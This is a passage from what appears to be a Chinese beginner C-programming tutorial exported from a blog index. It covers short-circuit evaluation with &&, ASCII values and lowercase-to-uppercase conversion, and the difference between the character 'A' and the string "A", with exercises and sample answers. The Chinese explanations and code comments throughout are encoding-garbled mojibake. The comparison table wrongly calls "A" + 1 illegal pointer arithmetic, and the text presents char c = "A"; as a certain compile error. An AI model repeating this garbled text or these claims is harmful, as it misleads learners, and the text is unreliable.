<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é€»è¾‘ä¸çŸ­è·¯ï¼šå› ä¸º (a != 0) ä¸ºå‡ï¼Œç”µè„‘ç›´æ¥åˆ¤å®šç»“æœä¸ºå‡</span></span><br><span class="line">    <span class="comment">// åé¢çš„ (b++ &gt; 10) æ ¹æœ¬ä¸ä¼šè¢«æ‰§è¡Œ</span></span><br><span class="line">    <span class="keyword">if</span> ((a != <span class="number">0</span>) &amp;&amp; (b++ &gt; <span class="number">10</span>)) &#123;</span><br><span class="line">        <span class="comment">// è¿™é‡Œä¸ä¼šæ‰§è¡Œ</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;æ‰§è¡Œå b çš„å€¼: %d\n&quot;</span>, b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>æ˜“é”™ï¼š</strong></p>
<ol>
<li><p>è¯¯ä»¥ä¸ºè¡¨è¾¾å¼é‡Œçš„ä»£ç ä¸€å®šä¼šæ‰§è¡Œã€‚</p>
</li>
<li><p><code>&amp;&amp;</code> è¿ç®—ä¸­ï¼Œä¸€æ—¦å·¦è¾¹ä¸ºå‡ (0)ï¼Œå³è¾¹ç«‹å³åœæ­¢æ‰§è¡Œã€‚</p>
</li>
</ol>
<hr>
<h2 id="6-ASCII-ç ä¸ç±»å‹è½¬æ¢"><a href="#6-ASCII-ç ä¸ç±»å‹è½¬æ¢" class="headerlink" title="6. ASCII ç ä¸ç±»å‹è½¬æ¢"></a>6. ASCII ç ä¸ç±»å‹è½¬æ¢</h2><ol>
<li><p><strong>å…³é”® ASCII ç å€¼</strong>ï¼š</p>
<ul>
<li><p><code>&#39;A&#39;</code> &#x3D; 65</p>
</li>
<li><p><code>&#39;a&#39;</code> &#x3D; 97 (å°å†™ &#x3D; å¤§å†™ + 32)</p>
</li>
<li><p><code>&#39;0&#39;</code> &#x3D; 48</p>
</li>
</ul>
</li>
<li><p><strong>è‡ªåŠ¨ç±»å‹è½¬æ¢</strong>ï¼š</p>
<ul>
<li>å½“ <code>int</code> å’Œ <code>double</code> è¿ç®—æ—¶ï¼Œç»“æœä¼šè‡ªåŠ¨å˜æˆ <code>double</code>ã€‚</li>
</ul>
</li>
</ol>
<hr>
<h3 id="ä¹ é¢˜-6-å¯¹åº”ï¼šASCII-ç ä¸å­—ç¬¦è®¡ç®—"><a href="#ä¹ é¢˜-6-å¯¹åº”ï¼šASCII-ç ä¸å­—ç¬¦è®¡ç®—" class="headerlink" title="ä¹ é¢˜ 6 (å¯¹åº”ï¼šASCII ç ä¸å­—ç¬¦è®¡ç®—)"></a><strong>ä¹ é¢˜ 6 (å¯¹åº”ï¼šASCII ç ä¸å­—ç¬¦è®¡ç®—)</strong></h3><p><strong>é¢˜ç›®ï¼š</strong> ç¼–å†™ç¨‹åºï¼Œè¾“å…¥ä¸€ä¸ªå°å†™å­—æ¯ï¼ˆå¦‚ â€˜aâ€™ï¼‰ï¼Œå°†å…¶è½¬æ¢ä¸ºå¤§å†™å­—æ¯å¹¶è¾“å‡ºã€‚åŒæ—¶è¾“å‡ºè½¬æ¢åçš„å­—ç¬¦å¯¹åº”çš„ ASCII ç æ•´æ•°å€¼ã€‚</p>
<p><strong>è¦æ±‚ï¼š</strong> åˆ©ç”¨ <code>&#39;a&#39;</code> å’Œ <code>&#39;A&#39;</code> ä¹‹é—´çš„å·®å€¼ (32) è¿›è¡Œè®¡ç®—ã€‚</p>
<p><strong>é¢„æœŸè¾“å‡ºç»“æœï¼š</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¾“å…¥å°å†™å­—æ¯: a</span><br><span class="line">è½¬æ¢åçš„å¤§å†™å­—æ¯: A</span><br><span class="line">å¯¹åº”çš„ ASCII ç : 65</span><br></pre></td></tr></table></figure>

<p><strong>ç­”æ¡ˆï¼š</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> small;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;è¾“å…¥å°å†™å­—æ¯: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>, &amp;small);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°å†™è½¬å¤§å†™ï¼šå‡å» 32</span></span><br><span class="line">    <span class="type">char</span> big = small - <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;è½¬æ¢åçš„å¤§å†™å­—æ¯: %c\n&quot;</span>, big);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;å¯¹åº”çš„ ASCII ç : %d\n&quot;</span>, big);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>æ˜“é”™ï¼š</strong></p>
<ol>
<li>æ··æ·†å¤§å°å†™è½¬æ¢çš„åŠ å‡æ–¹å‘ï¼ˆå°è½¬å¤§æ˜¯å‡ï¼Œå¤§è½¬å°æ˜¯åŠ ï¼‰ã€‚</li>
<li>å¿˜è®° <code>&#39;A&#39;</code> çš„ ASCII ç æ˜¯ 65ï¼Œ<code>&#39;a&#39;</code> æ˜¯ 97ã€‚</li>
</ol>
<hr>
<h2 id="7-å­—ç¬¦ä¸å­—ç¬¦ä¸²çš„åŒºåˆ«-å•å¼•å·-vs-åŒå¼•å·-å¿…è€ƒ"><a href="#7-å­—ç¬¦ä¸å­—ç¬¦ä¸²çš„åŒºåˆ«-å•å¼•å·-vs-åŒå¼•å·-å¿…è€ƒ" class="headerlink" title="7. å­—ç¬¦ä¸å­—ç¬¦ä¸²çš„åŒºåˆ« (å•å¼•å· vs åŒå¼•å·) [å¿…è€ƒ]"></a>7. å­—ç¬¦ä¸å­—ç¬¦ä¸²çš„åŒºåˆ« (å•å¼•å· vs åŒå¼•å·) <strong>[å¿…è€ƒ]</strong></h2><p>C è¯­è¨€ä¸­ï¼Œå•å¼•å·å’ŒåŒå¼•å·ç»å¯¹ä¸èƒ½æ··ç”¨ï¼Œå®ƒä»¬çš„æœ¬è´¨å®Œå…¨ä¸åŒã€‚</p>
<h3 id="7-1-æ ¸å¿ƒå¯¹æ¯”è¡¨"><a href="#7-1-æ ¸å¿ƒå¯¹æ¯”è¡¨" class="headerlink" title="7.1 æ ¸å¿ƒå¯¹æ¯”è¡¨"></a>7.1 æ ¸å¿ƒå¯¹æ¯”è¡¨</h3><table>
<thead>
<tr>
<th><strong>ç‰¹æ€§</strong></th>
<th><strong>å•å¼•å· â€˜ â€˜</strong></th>
<th><strong>åŒå¼•å· â€œ â€œ</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>å¯¹è±¡</strong></td>
<td><strong>å­—ç¬¦å¸¸é‡</strong> (Character)</td>
<td><strong>å­—ç¬¦ä¸²å­—é¢é‡</strong> (String)</td>
</tr>
<tr>
<td><strong>æœ¬è´¨</strong></td>
<td><strong>æ˜¯ä¸€ä¸ªæ•´æ•°</strong> (ASCII ç å€¼)</td>
<td><strong>æ˜¯ä¸€ä¸ªåœ°å€</strong> (æŒ‡å‘å†…å­˜ä¸­çš„æ•°ç»„)</td>
</tr>
<tr>
<td><strong>å¤§å° (ä»¥ â€˜Aâ€™ ä¸ºä¾‹)</strong></td>
<td>å  <strong>1</strong> ä¸ªå­—èŠ‚ (å­˜çš„æ˜¯ 65)</td>
<td>å  <strong>2</strong> ä¸ªå­—èŠ‚ (å­˜çš„æ˜¯ â€˜Aâ€™ å’Œ â€˜\0â€™)</td>
</tr>
<tr>
<td><strong>ç¤ºä¾‹</strong></td>
<td><code>char c = &#39;A&#39;;</code></td>
<td><code>char str[] = &quot;A&quot;;</code></td>
</tr>
<tr>
<td><strong>èƒ½åšåŠ å‡æ³•å—ï¼Ÿ</strong></td>
<td><strong>èƒ½</strong> (<code>&#39;A&#39; + 1</code> ç­‰äº 66)</td>
<td><strong>ä¸èƒ½</strong> (<code>&quot;A&quot; + 1</code> æ˜¯éæ³•æŒ‡é’ˆè¿ç®—)</td>
</tr>
</tbody></table>
<h3 id="7-2-ç»å…¸é™·é˜±ï¼šâ€™Aâ€™-å’Œ-â€œAâ€-çš„åŒºåˆ«"><a href="#7-2-ç»å…¸é™·é˜±ï¼šâ€™Aâ€™-å’Œ-â€œAâ€-çš„åŒºåˆ«" class="headerlink" title="7.2 ç»å…¸é™·é˜±ï¼šâ€™Aâ€™ å’Œ â€œAâ€ çš„åŒºåˆ«"></a>7.2 ç»å…¸é™·é˜±ï¼šâ€™Aâ€™ å’Œ â€œAâ€ çš„åŒºåˆ«</h3><p>è¿™æ˜¯é€‰æ‹©é¢˜æœ€çˆ±è€ƒçš„é¢˜ç›®ï¼š</p>
<ul>
<li><p><strong><code>&#39;A&#39;</code></strong>ï¼š</p>
<ul>
<li><p>å®ƒæ˜¯å•ä¸ªå­—ç¬¦ã€‚</p>
</li>
<li><p>åœ¨å†…å­˜é‡Œå°±æ˜¯æ•°å­— <strong>65</strong>ã€‚</p>
</li>
</ul>
</li>
<li><p><strong><code>&quot;A&quot;</code></strong>ï¼š</p>
<ul>
<li><p>å®ƒæ˜¯å­—ç¬¦ä¸²ã€‚</p>
</li>
<li><p>è™½ç„¶çœ‹èµ·æ¥åªæœ‰ä¸€ä¸ªå­—æ¯ï¼Œä½† C è¯­è¨€ä¼šè‡ªåŠ¨åœ¨åé¢åŠ ä¸€ä¸ªç»“æŸç¬¦ <code>\0</code>ã€‚</p>
</li>
<li><p>æ‰€ä»¥åœ¨å†…å­˜é‡Œå®ƒæ˜¯ï¼š<code>&#39;A&#39;</code> + <code>\0&#39;</code>ã€‚</p>
</li>
</ul>
</li>
</ul>
<p><strong>é”™è¯¯å†™æ³•ï¼š</strong></p>
<p>char c &#x3D; â€œAâ€; &#x2F;&#x2F; é”™ï¼ä¸èƒ½æŠŠä¸€ä¸ªâ€œå­—ç¬¦ä¸²åœ°å€â€ç¡¬å¡ç»™ä¸€ä¸ªâ€œå­—ç¬¦å˜é‡â€ã€‚</p>
<p>char str[] &#x3D; â€˜Aâ€™; &#x2F;&#x2F; é”™ï¼ä¸èƒ½ç”¨å•ä¸ªå­—ç¬¦å»åˆå§‹åŒ–æ•°ç»„ï¼ˆé™¤éç”¨èŠ±æ‹¬å·ï¼‰ã€‚</p>
<hr>
<h3 id="ä¹ é¢˜-7-å¯¹åº”ï¼šå•å¼•å·ä¸åŒå¼•å·çš„åŒºåˆ«"><a href="#ä¹ é¢˜-7-å¯¹åº”ï¼šå•å¼•å·ä¸åŒå¼•å·çš„åŒºåˆ«" class="headerlink" title="ä¹ é¢˜ 7 (å¯¹åº”ï¼šå•å¼•å·ä¸åŒå¼•å·çš„åŒºåˆ«)"></a>ä¹ é¢˜ 7 (å¯¹åº”ï¼šå•å¼•å·ä¸åŒå¼•å·çš„åŒºåˆ«)</h3><p>é¢˜ç›®ï¼š ç¼–å†™ç¨‹åºï¼Œå®šä¹‰å­—ç¬¦å˜é‡ c &#x3D; â€˜Aâ€™ å’Œå­—ç¬¦ä¸²æ•°ç»„ str &#x3D; â€œAâ€ã€‚</p>
<p>è¯·é€šè¿‡ sizeof è¿ç®—ç¬¦ï¼Œåˆ†åˆ«æ‰“å°å®ƒä»¬åœ¨å†…å­˜ä¸­å ç”¨çš„å­—èŠ‚æ•°ï¼Œä»¥éªŒè¯ â€œAâ€ ç¡®å®æ¯” â€˜Aâ€™ å¤šä¸€ä¸ª \0ã€‚</p>
<p><strong>è¦æ±‚ï¼š</strong></p>
<ol>
<li><p>ä½¿ç”¨ <code>sizeof</code> è¿ç®—ç¬¦ã€‚</p>
</li>
<li><p>ç†è§£ä¸ºä»€ä¹ˆå­—ç¬¦ä¸²çš„å¤§å°æ˜¯ 2ã€‚</p>
</li>
</ol>
<p><strong>é¢„æœŸè¾“å‡ºç»“æœï¼š</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å­—ç¬¦ &#x27;A&#x27; çš„å¤§å°: 1</span><br><span class="line">å­—ç¬¦ä¸² &quot;A&quot; çš„å¤§å°: 2</span><br></pre></td></tr></table></figure>

<p><em>(æ³¨ï¼šåœ¨æŸäº›ç¼–è¯‘å™¨ä¸‹ï¼Œsizeof(â€˜Aâ€™) å¯èƒ½ä¼šæ˜¾ç¤º 4ï¼Œå› ä¸º C è¯­è¨€å°†å­—ç¬¦å¸¸é‡è§†ä¸º intï¼Œä½†è¿™é‡Œæˆ‘ä»¬è¦éªŒè¯çš„æ˜¯å®ƒä½œä¸º char å­˜å‚¨æ—¶çš„æ¦‚å¿µï¼Œæˆ–è€…å¯ä»¥ç›´æ¥å¯¹æ¯” sizeof(charå˜é‡) å’Œ sizeof(â€œAâ€)ã€‚ä¸ºäº†ä¸è®©ä½ æ··æ·†ï¼Œæˆ‘ä»¬å¯¹æ¯”å˜é‡å’Œå­—ç¬¦ä¸²å­—é¢é‡)</em></p>
<p><strong>ä¿®æ­£åçš„ä¸¥è°¨ç­”æ¡ˆï¼š</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> c = <span class="string">&#x27;A&#x27;</span>;        <span class="comment">// å•å¼•å·ï¼šå•ä¸ªå­—ç¬¦</span></span><br><span class="line">    <span class="comment">// char str[] = &quot;A&quot;; // åŒå¼•å·ï¼šå­—ç¬¦ä¸² (åŒ…å« &#x27;A&#x27; å’Œ &#x27;\0&#x27;)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// sizeof(c) è®¡ç®—å˜é‡ c å ç”¨çš„ç©ºé—´ -&gt; 1 å­—èŠ‚</span></span><br><span class="line">    <span class="comment">// sizeof(&quot;A&quot;) è®¡ç®—å­—ç¬¦ä¸² &quot;A&quot; å ç”¨çš„ç©ºé—´ -&gt; 2 å­—èŠ‚ (&#x27;A&#x27; + &#x27;\0&#x27;)</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;å­—ç¬¦å˜é‡ c çš„å¤§å°: %lu\n&quot;</span>, <span class="keyword">sizeof</span>(c));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;å­—ç¬¦ä¸² \&quot;A\&quot; çš„å¤§å°: %lu\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&quot;A&quot;</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>æ˜“é”™ï¼š</strong></p>
<ol>
<li><p>æ··æ·†æ¦‚å¿µï¼Œä»¥ä¸º <code>&quot;A&quot;</code> ä¹Ÿåªå  1 ä¸ªå­—èŠ‚ã€‚</p>
</li>
<li><p>è¯•å›¾å†™ <code>char c = &quot;A&quot;;</code> å¯¼è‡´ç¼–è¯‘æŠ¥é”™ï¼ˆç±»å‹ä¸åŒ¹é…ï¼‰ã€‚</p>
</li>
<li><p>åœ¨ <code>printf</code> é‡Œæ‰“å°åŒå¼•å·éœ€è¦è½¬ä¹‰ï¼š<code>\&quot;</code>ã€‚</p>
</li>
</ol>
]]></content>
      <categories>
        <category>ç¼–ç¨‹è¯­è¨€</category>
        <category>Cè¯­è¨€</category>
      </categories>
      <tags>
        <tag>Cè¯­è¨€</tag>
      </tags>
  </entry>
</search>
